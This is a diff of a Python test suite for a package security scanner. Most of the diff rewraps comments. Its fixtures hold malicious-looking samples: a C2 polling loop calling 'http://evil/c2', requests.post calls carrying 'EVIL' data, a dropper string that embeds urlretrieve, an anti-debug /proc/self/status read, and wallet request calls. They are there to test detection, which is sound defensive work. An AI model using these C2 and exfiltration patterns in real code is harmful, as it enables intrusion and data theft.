@@ -35,8 +35,8 @@ def test_fixture_bytes_are_deterministic(tmp_path):
     rebuild_dir.mkdir()
     builder_src = (FIXTURES / "_build.py").read_text(encoding = "utf-8")
     rebuilt_helper = rebuild_dir / "_build.py"
+    # builder_src came out of a checked-in file, so it carries whatever
     # non-ASCII that file holds and cp1252 cannot encode it back out.
-    # builder_src came out of a checked-in file, so it carries whatever non-ASCII that file holds and cp1252 cannot
     rebuilt_helper.write_text(builder_src, encoding = "utf-8")
     shim = rebuild_dir / "run.py"
     shim.write_text(
@@ -286,8 +286,9 @@ def test_anti_analysis_no_longer_flags_cross_platform_code():
 
 
 def test_proc_self_status_read_flags_anti_analysis():
-    # The old `\b/proc/self/status\b` was unsatisfiable (\b adjacent to "/");
     # Reading /proc/self/status + a subprocess call is the classic anti-debug combo.
+    # The old `\b/proc/self/status\b` was unsatisfiable (\b adjacent to "/"); the
+    # lookbehind fix makes it fire. No TracerPid/ptrace token, so only /proc signals it.
     payload = (
         "import subprocess\n"
         "with open('/proc/self/status') as fh:\n"
@@ -777,9 +778,10 @@ def test_logical_line_end_blanks_multiline_triple_string():
 
 
 def test_extract_evidence_binds_call_embedded_in_string():
+    # A call whose text lives INSIDE a triple-quoted string (a dropper embedding a
     # setup.py payload) must still bind its argument lines. Blanking the multi-line
     # string must not shrink the span below the legacy single-line view: the union
-    # A call whose text lives INSIDE a triple-quoted string (a dropper embedding a setup.py payload) must still bind
+    # of both views keeps the URL argument bound so a changed payload reopens.
     src = (
         'PAYLOAD = """\n'
         "urllib.request.urlretrieve(\n"
@@ -832,8 +834,10 @@ def test_extract_evidence_same_line_close_then_open_binds_call():
 
 
 def test_extract_evidence_backslash_continued_string_binds_tail():
-    # The `)` inside that continued string on the next line must not be counted as
     # A single-quoted string can continue across lines with a trailing backslash.
+    # The `)` inside that continued string on the next line must not be counted as
+    # code and close the call early, or a changed argument after it would not
+    # reopen. The blanker tracks the continuation so the whole call binds.
     old = "requests.post('http://h\\\n/path)', data='old')\n"
     new = "requests.post('http://h\\\n/path)', data='EVIL')\n"
     assert sp._evidence_hash(sp._extract_evidence(old, sp.RE_NETWORK)) != sp._evidence_hash(
@@ -842,8 +846,10 @@ def test_extract_evidence_backslash_continued_string_binds_tail():
 
 
 def test_extract_evidence_long_call_tail_past_soft_cap_reopens():
+    # A call with more argument lines than the soft cap (_MAX_CALL_LINES) is still
+    # followed to its real close under the hard limit, so a changed payload on a
+    # continuation line well past the soft cap reopens instead of riding the first
     # _MAX_CALL_LINES lines. A bracket that never closes stays bound to the soft cap.
-    # A call with more argument lines than the soft cap (_MAX_CALL_LINES) is still followed to its real close under the
     mid = "\n".join(f"  opt{i}=1," for i in range(sp._MAX_CALL_LINES + 20))
     old = "requests.post(\n" + mid + "\n  data='old',\n)\n"
     new = "requests.post(\n" + mid + "\n  data='EVIL',\n)\n"
@@ -1009,8 +1015,8 @@ def test_extract_evidence_binds_call_continuation_lines():
 
 
 def test_extract_evidence_records_multiline_after_oneline():
+    # A one-line C2 match no longer suppresses a later multi-line C2 loop: the
     # appended cross-line construct is recorded too, so it cannot ride the key.
-    # A one-line C2 match no longer suppresses a later multi-line C2 loop:
     oneline = "while True: time.sleep(60); requests.get('http://a/poll')\n"
     appended = oneline + "while True:\n    time.sleep(30)\n    requests.get('http://evil/c2')\n"
     eo = sp._extract_evidence(oneline, sp.RE_C2_POLLING)
@@ -1069,8 +1075,10 @@ def test_hidden_payload_binds_visible_exec_trigger():
 
 
 def test_js_finding_pins_full_content_digest():
+    # A JS finding pins the full file content digest, so a backtick template literal
     # that closes the bracket span early cannot let later option/body lines change
-    # A JS finding pins the full file content digest, so a backtick template literal that closes the bracket span early
+    # without reopening (the Python-string-aware extractor would otherwise omit
+    # them). Holds for small files too, not just large bundles.
     old = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'OLD'})\n"
     new = "window.ethereum.request(`tpl with ) paren`,\n  {method: 'eth', body: 'EVIL'})\n"
     fo = [f for f in sp.check_js_file(old, "p/w.js", "p") if "Web3" in f.check][0]
@@ -1428,9 +1436,8 @@ def test_hidden_payload_survives_visible_decoy():
 
 
 def test_comment_only_network_exec_not_flagged():
-    # network+exec combo must NOT also fire on them.
-    # Both calls live in REAL code (covered by the normal checks);
-    # Tokens only in comments are not executable by exec();
+    # Tokens only in comments are not executable by exec(); the hidden network+exec
+    # check inspects strings/docstrings (not comments), so this must stay clean.
     src = (
         "code = 'x = 1'\n"
         "exec(code)\n"
@@ -1464,8 +1471,8 @@ def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
     active2, suppressed2 = sp._partition_baseline([new_kind], baseline)
     assert active2 == [new_kind] and suppressed2 == []
 
+    # Same file + same check but CHANGED flagged code -> still active. A future
     # malicious payload cannot ride a previously reviewed entry's suppression.
-    # Same file + same check but CHANGED flagged code -> still active.
     changed_code = _mk(
         sp.CRITICAL,
         "fastapi",
@@ -1666,8 +1673,8 @@ def test_marker_holds_by_default():
     assert sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
     # No marker / plain env marker -> kept.
     assert sp._marker_holds_by_default("") is True
+    # Platform/python markers are kept: the scanner runs on one target but the
     # package may install on another, so these deps must still be scanned.
-    # Platform/python markers are kept:
     assert sp._marker_holds_by_default("sys_platform == 'win32'") is True
     assert sp._marker_holds_by_default("python_version == '3.13'") is True
     assert sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'") is True
@@ -1801,6 +1808,9 @@ def test_per_spec_sdist_only_is_not_error(tmp_path, monkeypatch):
     assert any(p.name.endswith(".tar.gz") for p in tmp_path.iterdir())
 
 
+# ---------------------------------------------------------------------------
+# --fix path: download_packages() returns (results, download_errors); both
+# --fix call sites must unpack the tuple, not treat it as the results list.
 # ---------------------------------------------------------------------------
 
 
@@ -2261,8 +2271,17 @@ def _audited_requirements(root):
             yield "pyproject.toml", spec
 
 
+# unsloth_zoo is digest-pinned and deliberately NOT version-pinned, so it is named
+# here rather than quietly skipped. The recurrence this guard exists to stop is an
+# upstream release we do not control changing the bytes and reddening main on a day
+# nobody touched the repo. unsloth_zoo is our own, released in lockstep with this
+# package, and pinning it exactly would break that; when its digest reopens, the
 # change is one of ours and re-reviewing it is the point of the pin (#8104, and that
-# unsloth_zoo is digest-pinned and deliberately NOT version-pinned, so it is named here rather than quietly skipped.
+# entry is the credential send itself). Third-party packages get no such licence, so
+# the test asserts this list holds only first-party names.
+# Exactly the first-party packages that ARE digest-pinned today, asserted below to
+# be exactly that, so a name added here without an entry, or a third-party name
+# added at all, fails rather than silently widening the exemption.
 FIRST_PARTY_DIGEST_PINNED = {"unsloth-zoo"}
 
 
